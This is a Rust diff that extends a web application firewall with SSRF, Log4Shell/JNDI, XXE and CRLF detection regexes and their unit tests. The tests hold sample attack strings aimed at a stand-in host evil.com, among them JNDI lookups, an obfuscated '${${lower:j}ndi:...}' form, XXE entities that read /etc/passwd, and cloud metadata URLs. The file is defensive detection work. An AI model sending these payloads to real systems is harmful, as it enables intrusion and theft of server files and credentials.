@@ -24,6 +24,9 @@ pub enum RuleCategory {
     PathTraversal,
     CommandInjection,
     ProtocolViolation,
+    Ssrf,
+    LogInjection,
+    Xxe,
 }
 
 impl RuleCategory {
@@ -34,6 +37,9 @@ impl RuleCategory {
             Self::PathTraversal => "path_traversal",
             Self::CommandInjection => "command_injection",
             Self::ProtocolViolation => "protocol_violation",
+            Self::Ssrf => "ssrf",
+            Self::LogInjection => "log_injection",
+            Self::Xxe => "xxe",
         }
     }
 }
@@ -47,6 +53,9 @@ impl std::str::FromStr for RuleCategory {
             "path_traversal" => Ok(Self::PathTraversal),
             "command_injection" => Ok(Self::CommandInjection),
             "protocol_violation" => Ok(Self::ProtocolViolation),
+            "ssrf" => Ok(Self::Ssrf),
+            "log_injection" => Ok(Self::LogInjection),
+            "xxe" => Ok(Self::Xxe),
             other => Err(format!("unknown rule category: {other}")),
         }
     }
@@ -225,6 +234,88 @@ impl RuleSet {
                 pattern: Regex::new(r"(?i)content-length\s*:\s*[^\d]").unwrap(),
                 severity: 5,
             },
+            WafRule {
+                id: 920110,
+                description: "CRLF injection via encoded line break",
+                category: RuleCategory::ProtocolViolation,
+                pattern: Regex::new(r"(%0d%0a|%0d|%0a|\r\n)").unwrap(),
+                severity: 4,
+            },
+            // --- SSRF (CRS 934xxx) ---
+            WafRule {
+                id: 934100,
+                description: "SSRF via cloud metadata endpoint",
+                category: RuleCategory::Ssrf,
+                pattern: Regex::new(
+                    r"(?i)(169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200)",
+                ).unwrap(),
+                severity: 5,
+            },
+            WafRule {
+                id: 934110,
+                description: "SSRF via localhost/loopback access",
+                category: RuleCategory::Ssrf,
+                pattern: Regex::new(
+                    r"(?i)(https?://(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|0x7f))",
+                ).unwrap(),
+                severity: 5,
+            },
+            WafRule {
+                id: 934120,
+                description: "SSRF via dangerous URI scheme",
+                category: RuleCategory::Ssrf,
+                pattern: Regex::new(
+                    r"(?i)(file|gopher|dict|ftp|ldap|tftp)://"
+                ).unwrap(),
+                severity: 5,
+            },
+            WafRule {
+                id: 934130,
+                description: "SSRF via internal network range",
+                category: RuleCategory::Ssrf,
+                pattern: Regex::new(
+                    r"(?i)https?://(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})[:/]",
+                ).unwrap(),
+                severity: 4,
+            },
+            // --- Log4Shell / JNDI Injection (CRS 944xxx) ---
+            WafRule {
+                id: 944100,
+                description: "Log4Shell JNDI injection",
+                category: RuleCategory::LogInjection,
+                pattern: Regex::new(
+                    r"(?i)\$\{(\$\{.*\}|jndi|lower|upper|env|sys|date|java).*[:/]",
+                ).unwrap(),
+                severity: 5,
+            },
+            WafRule {
+                id: 944110,
+                description: "Log4Shell JNDI protocol lookup",
+                category: RuleCategory::LogInjection,
+                pattern: Regex::new(
+                    r"(?i)jndi\s*:\s*(ldap|ldaps|rmi|dns|iiop|corba|nds|http)s?\s*:",
+                ).unwrap(),
+                severity: 5,
+            },
+            // --- XXE (CRS 936xxx) ---
+            WafRule {
+                id: 936100,
+                description: "XXE via DOCTYPE/ENTITY declaration",
+                category: RuleCategory::Xxe,
+                pattern: Regex::new(
+                    r"(?i)<!\s*(DOCTYPE|ENTITY)[^>]*(SYSTEM|PUBLIC)",
+                ).unwrap(),
+                severity: 5,
+            },
+            WafRule {
+                id: 936110,
+                description: "XXE via XML external entity reference",
+                category: RuleCategory::Xxe,
+                pattern: Regex::new(
+                    r#"(?i)<!ENTITY\s+\S+\s+SYSTEM\s+['"]"#,
+                ).unwrap(),
+                severity: 5,
+            },
         ];
 
         Self { rules }
@@ -267,6 +358,9 @@ mod tests {
         assert!(categories.contains(&RuleCategory::PathTraversal));
         assert!(categories.contains(&RuleCategory::CommandInjection));
         assert!(categories.contains(&RuleCategory::ProtocolViolation));
+        assert!(categories.contains(&RuleCategory::Ssrf));
+        assert!(categories.contains(&RuleCategory::LogInjection));
+        assert!(categories.contains(&RuleCategory::Xxe));
     }
 
     // --- SQL Injection detection ---
@@ -410,6 +504,102 @@ mod tests {
         assert!(rule.pattern.is_match("$(cat /etc/passwd)"));
     }
 
+    // --- CRLF Injection ---
+
+    #[test]
+    fn test_crlf_injection() {
+        let rs = RuleSet::default_crs();
+        let rule = rs.rules().iter().find(|r| r.id == 920110).unwrap();
+        assert!(rule.pattern.is_match("header%0d%0ainjected: value"));
+        assert!(rule.pattern.is_match("value%0d%0aSet-Cookie: evil"));
+        assert!(!rule.pattern.is_match("normal header value"));
+    }
+
+    // --- SSRF detection ---
+
+    #[test]
+    fn test_ssrf_cloud_metadata() {
+        let rs = RuleSet::default_crs();
+        let rule = rs.rules().iter().find(|r| r.id == 934100).unwrap();
+        assert!(rule.pattern.is_match("http://169.254.169.254/latest/meta-data/"));
+        assert!(rule.pattern.is_match("http://metadata.google.internal/computeMetadata/"));
+        assert!(!rule.pattern.is_match("http://example.com/page"));
+    }
+
+    #[test]
+    fn test_ssrf_localhost() {
+        let rs = RuleSet::default_crs();
+        let rule = rs.rules().iter().find(|r| r.id == 934110).unwrap();
+        assert!(rule.pattern.is_match("http://localhost/admin"));
+        assert!(rule.pattern.is_match("http://127.0.0.1:8080/"));
+        assert!(rule.pattern.is_match("http://[::1]/secret"));
+        assert!(rule.pattern.is_match("http://0.0.0.0/"));
+        assert!(!rule.pattern.is_match("http://example.com/"));
+    }
+
+    #[test]
+    fn test_ssrf_dangerous_scheme() {
+        let rs = RuleSet::default_crs();
+        let rule = rs.rules().iter().find(|r| r.id == 934120).unwrap();
+        assert!(rule.pattern.is_match("file:///etc/passwd"));
+        assert!(rule.pattern.is_match("gopher://evil.com/_GET"));
+        assert!(rule.pattern.is_match("dict://evil.com/info"));
+        assert!(rule.pattern.is_match("ldap://evil.com/dc=com"));
+        assert!(!rule.pattern.is_match("https://example.com/"));
+    }
+
+    #[test]
+    fn test_ssrf_internal_network() {
+        let rs = RuleSet::default_crs();
+        let rule = rs.rules().iter().find(|r| r.id == 934130).unwrap();
+        assert!(rule.pattern.is_match("http://10.0.0.1:8080/admin"));
+        assert!(rule.pattern.is_match("http://172.16.0.1/"));
+        assert!(rule.pattern.is_match("http://192.168.1.1/"));
+        assert!(!rule.pattern.is_match("http://8.8.8.8/"));
+    }
+
+    // --- Log4Shell / JNDI detection ---
+
+    #[test]
+    fn test_log4shell_jndi() {
+        let rs = RuleSet::default_crs();
+        let rule = rs.rules().iter().find(|r| r.id == 944100).unwrap();
+        assert!(rule.pattern.is_match("${jndi:ldap://evil.com/a}"));
+        assert!(rule.pattern.is_match("${${lower:j}ndi:ldap://evil.com}"));
+        assert!(rule.pattern.is_match("${jndi:rmi://evil.com/obj}"));
+        assert!(!rule.pattern.is_match("${variable}"));
+    }
+
+    #[test]
+    fn test_log4shell_jndi_protocol() {
+        let rs = RuleSet::default_crs();
+        let rule = rs.rules().iter().find(|r| r.id == 944110).unwrap();
+        assert!(rule.pattern.is_match("jndi:ldap://evil.com"));
+        assert!(rule.pattern.is_match("jndi:rmi://evil.com"));
+        assert!(rule.pattern.is_match("jndi:dns://evil.com"));
+        assert!(!rule.pattern.is_match("jndi_config=true"));
+    }
+
+    // --- XXE detection ---
+
+    #[test]
+    fn test_xxe_doctype() {
+        let rs = RuleSet::default_crs();
+        let rule = rs.rules().iter().find(|r| r.id == 936100).unwrap();
+        assert!(rule.pattern.is_match("<!DOCTYPE foo SYSTEM \"http://evil.com/xxe.dtd\">"));
+        assert!(rule.pattern.is_match("<!DOCTYPE foo PUBLIC \"-//W3C\" \"http://evil.com\">"));
+        assert!(!rule.pattern.is_match("<html>normal page</html>"));
+    }
+
+    #[test]
+    fn test_xxe_entity() {
+        let rs = RuleSet::default_crs();
+        let rule = rs.rules().iter().find(|r| r.id == 936110).unwrap();
+        assert!(rule.pattern.is_match("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"));
+        assert!(rule.pattern.is_match("<!ENTITY xxe SYSTEM 'http://evil.com/data'>"));
+        assert!(!rule.pattern.is_match("<entity>normal xml</entity>"));
+    }
+
     // --- Category as_str ---
 
     #[test]
@@ -419,5 +609,8 @@ mod tests {
         assert_eq!(RuleCategory::PathTraversal.as_str(), "path_traversal");
         assert_eq!(RuleCategory::CommandInjection.as_str(), "command_injection");
         assert_eq!(RuleCategory::ProtocolViolation.as_str(), "protocol_violation");
+        assert_eq!(RuleCategory::Ssrf.as_str(), "ssrf");
+        assert_eq!(RuleCategory::LogInjection.as_str(), "log_injection");
+        assert_eq!(RuleCategory::Xxe.as_str(), "xxe");
     }
 }
